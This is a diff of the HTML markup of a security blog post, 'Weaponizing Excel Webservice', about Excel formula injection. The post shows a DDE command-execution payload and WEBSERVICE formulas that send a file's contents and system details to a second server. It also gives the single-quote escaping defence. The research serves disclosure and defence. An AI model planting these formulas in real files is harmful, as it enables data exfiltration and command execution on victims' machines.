@@ -1,7 +1,7 @@
 <!DOCTYPE HTML>
 <html>
-  <head> <meta charset="utf-8"/>
-<meta name="generator" content="Docutils 0.16: http://docutils.sourceforge.net/" />
+  <head> <meta charset="utf-8" />
+<meta name="generator" content="Docutils 0.20.1: https://docutils.sourceforge.io/" />
 <title>Breakpoint: Weaponizing Excel Webservice</title>
     <link rel="stylesheet" type="text/css" href="../style/base.css"/>
     <link rel="stylesheet" type="text/css" href="../style/pygments.css"/>
@@ -46,12 +46,12 @@
     </header>
 
     <div class="content">
-      <div class="section" id="weaponizing-excel-webservice">
-<h1>Weaponizing Excel Webservice</h1>
-<div class="section" id="state-of-the-art">
-<h2>State of the art</h2>
-<div class="section" id="excel-formulas">
-<h3>Excel formulas</h3>
+      <section id="weaponizing-excel-webservice">
+<h2>Weaponizing Excel Webservice</h2>
+<section id="state-of-the-art">
+<h3>State of the art</h3>
+<section id="excel-formulas">
+<h4>Excel formulas</h4>
 <p>Did you know that Microsoft Excel has some functions that could be exploited
 by malicious actors? I'm not talking about macros here, but plain old
 formulas.</p>
@@ -59,9 +59,9 @@ formulas.</p>
 by any anti-macro system, nor is it detected by any antivirus as being a bad
 thing. Moreover there are cleverer ways to use them than just send someone
 else an XLS file.</p>
-</div>
-<div class="section" id="formula-injection">
-<h3>Formula injection</h3>
+</section>
+<section id="formula-injection">
+<h4>Formula injection</h4>
 <p>Many systems propose to create an Excel file from a CSV one, or a database in
 order to produce a report. Those entries are rarely escaped so anyone
 submitting a CSV with formulas in it can expect to see the formulas being
@@ -71,9 +71,9 @@ a phishy XLS just received by email, so these injection techniques can lead
 us to computers we couldn't touch before.</p>
 <p>It seems the first mention of this was in an article by <a class="reference external" href="https://www.contextis.com/resources/blog/comma-separated-vulnerabilities/">contextis</a> in 2014.
 It described two main ways to exploit Microsoft Excel using only formulas.</p>
-</div>
-<div class="section" id="dde">
-<h3>DDE</h3>
+</section>
+<section id="dde">
+<h4>DDE</h4>
 <p>Dynamic Data Exchange: an interprocess communication protocol. Ok, let's just
 say that it allows us to execute any executable with any argument:</p>
 <pre class="literal-block">=cmd|' /C calc'!A0</pre>
@@ -81,9 +81,9 @@ say that it allows us to execute any executable with any argument:</p>
 opened which is good. However the user will have lots of warnings when
 openning it so unless we built a very good trust relationship this is hardly
 exploitable.</p>
-</div>
-<div class="section" id="hyperlink">
-<h3>Hyperlink</h3>
+</section>
+<section id="hyperlink">
+<h4>Hyperlink</h4>
 <p>Hyperlink allows us to open a URL in the webbrowser when the hyperlink cell
 is clicked. The good point is that as the webbrowser is used we have access
 to the cookies and can do CSRF attacks. We also don't have any restriction on
@@ -96,10 +96,10 @@ shouldn't.</p>
 <img alt="../image/applejack_eyebrow.png" src="../image/applejack_eyebrow.png" style="width: 25%;" />
 <p>So yeah, the situation was pretty dire, to the point where many <a class="reference external" href="https://sites.google.com/site/bughunteruniversity/nonvuln/csv-excel-formula-injection">companies</a>
 considered that excel injection formulas were not worth fixing.</p>
-</div>
-</div>
-<div class="section" id="webservice">
-<h2>Webservice</h2>
+</section>
+</section>
+<section id="webservice">
+<h3>Webservice</h3>
 <p>Then came Excel 2013. This release brought many very interesting functions,
 including:</p>
 <ul class="simple">
@@ -113,14 +113,14 @@ function takes a URL, makes a GET request to recover its content and returns
 this data as the content of the cell. And all that without ever asking for
 any user interaction besides opening the sheet.</p>
 <p>This is very powerful and I would like to share some use cases.</p>
-<div class="section" id="csrf">
-<h3>CSRF</h3>
+<section id="csrf">
+<h4>CSRF</h4>
 <p>The basic usage, just do a plain old call to the URL. The problem is that as
 we are not using a browser it only works if the webservice isn't relying on
 session cookies and needs only one GET request.</p>
-</div>
-<div class="section" id="information-disclosure">
-<h3>Information disclosure</h3>
+</section>
+<section id="information-disclosure">
+<h4>Information disclosure</h4>
 <p>This is more interesting. As the content of the page is returned by the
 function we can extract any data to one of our servers.</p>
 <p>For the purpose of the test I will work with two servers running in local:</p>
@@ -139,17 +139,17 @@ the content of the page as GET argument.</p>
 <pre class="literal-block">=webservice(&quot;http://127.0.0.1:8001/?c=&quot;
             &amp; webservice(&quot;http://127.0.0.1:8000/password.ini&quot;))</pre>
 <img alt="../image/excel_ws_attack_server_2.png" src="../image/excel_ws_attack_server_2.png" />
-</div>
-<div class="section" id="system-informations">
-<h3>System informations</h3>
+</section>
+<section id="system-informations">
+<h4>System informations</h4>
 <p>We can also get some informations about the system:</p>
 <pre class="literal-block">=webservice(&quot;http://127.0.0.1:8001/&quot;
             &amp; &quot;?v=&quot; &amp; info(&quot;osversion&quot;)
             &amp; &quot;&amp;d=&quot; &amp; info(&quot;directory&quot;))</pre>
 <img alt="../image/excel_ws_os_version.png" src="../image/excel_ws_os_version.png" />
-</div>
-<div class="section" id="other-ideas">
-<h3>Other ideas</h3>
+</section>
+<section id="other-ideas">
+<h4>Other ideas</h4>
 <p>It is also possible to use this for basic port scan or host discovery.</p>
 <p>We could also extract data from within the spreadsheet if it is generated on
 the server side with sensitive data.</p>
@@ -158,9 +158,9 @@ which widens the possibility. Don't forget that Excel has lots of text
 manipulation functions too.</p>
 <p>The sky's the limit!</p>
 <img alt="../image/rainbowdash-flying.png" src="../image/rainbowdash-flying.png" style="width: 60%;" />
-</div>
-<div class="section" id="limitations">
-<h3>Limitations</h3>
+</section>
+<section id="limitations">
+<h4>Limitations</h4>
 <p>I encountered some limitations while exploring this:</p>
 <ul class="simple">
 <li><p>The protocol has to be HTTP or HTTPS. It is possible that others are
@@ -174,10 +174,10 @@ closed the frozen spreasheet long before completion.</p></li>
 <li><p>We cannot recover binary data as any NULL byte would not make it to the URL
 for exfiltration.</p></li>
 </ul>
-</div>
-</div>
-<div class="section" id="conclusion">
-<h2>Conclusion</h2>
+</section>
+</section>
+<section id="conclusion">
+<h3>Conclusion</h3>
 <p>I believe those attacks are relevant enough to consider Excel Formula
 Injection a real vulnerability. Moreover I won't talk of CSV injection as
 other websites do because this is not limited to CSV at all.</p>
@@ -185,15 +185,15 @@ other websites do because this is not limited to CSV at all.</p>
 hear about it.</p>
 <p>Last but not least, if you want to escape a field, just put a single quote as
 first character. Excel will handle the rest just fine.</p>
-<div class="section" id="images-sources">
-<h3>Images sources</h3>
+<section id="images-sources">
+<h4>Images sources</h4>
 <ul class="simple">
 <li><p><a class="reference external" href="http://themajesticpony.deviantart.com/art/Applejack-raises-her-eyebrow-429862102">http://themajesticpony.deviantart.com/art/Applejack-raises-her-eyebrow-429862102</a></p></li>
 <li><p><a class="reference external" href="http://www.pngmart.com/image/23093">http://www.pngmart.com/image/23093</a></p></li>
 </ul>
-</div>
-</div>
-</div>
+</section>
+</section>
+</section>
     </div>
     <footer "class"="site-footer">
       <div "class"="publication_date">
